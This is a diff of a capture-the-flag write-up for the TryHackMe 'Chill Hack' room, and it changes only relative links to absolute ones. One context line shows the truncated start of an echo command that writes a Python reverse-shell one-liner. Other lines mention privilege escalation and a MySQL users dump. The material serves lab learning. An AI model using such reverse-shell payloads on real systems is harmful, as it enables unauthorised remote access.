@@ -2,19 +2,19 @@
 
 | Stat | Value |
 | ---------- | -------------------------------------------- |
-| Image | <img src="../../images/write_ups/try_hack_me/chill_hack/chill_hack.png" alt="Chill Hack" width="90"/> |
+| Image | <img src="/images/write_ups/try_hack_me/chill_hack/chill_hack.png" alt="Chill Hack" width="90"/> |
 | Room | Chill Hack |
 | URL | https://tryhackme.com/room/chillhack |
 | Difficulty | Easy |
 
 ## Concepts/Tools Used
 
-- [ftp](../../tools/ftp.md)
-- [gobuster](../../tools/gobuster.md)
+- [ftp](/tools/ftp.md)
+- [gobuster](/tools/gobuster.md)
 - [CyberChef](https://gchq.github.io/CyberChef/)
 - mysql
-- [steghide](../../tools/steghide.md)
-- [john](../../tools/john.md)
+- [steghide](/tools/steghide.md)
+- [john](/tools/john.md)
 - docker
 
 ## Room Description
@@ -203,7 +203,7 @@ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 
 I have a shell. I'm in!
 
-I get a stable shell using the [guide found here](../../README.md#stable-shell).
+I get a stable shell using the [guide found here](/README.md#stable-shell).
 
 ## User Flag
 
@@ -261,7 +261,7 @@ mysql> select * from users;
 2 rows in set (0.00 sec)
 ```
 
-I ran my [usual list of privilege escalation commands](../../concepts/privilege_escalation.md#linux-privilege-escalation). The sudo -l command returns something interesting:
+I ran my [usual list of privilege escalation commands](/concepts/privilege_escalation.md#linux-privilege-escalation). The sudo -l command returns something interesting:
 
 ```bash
 $ sudo -l
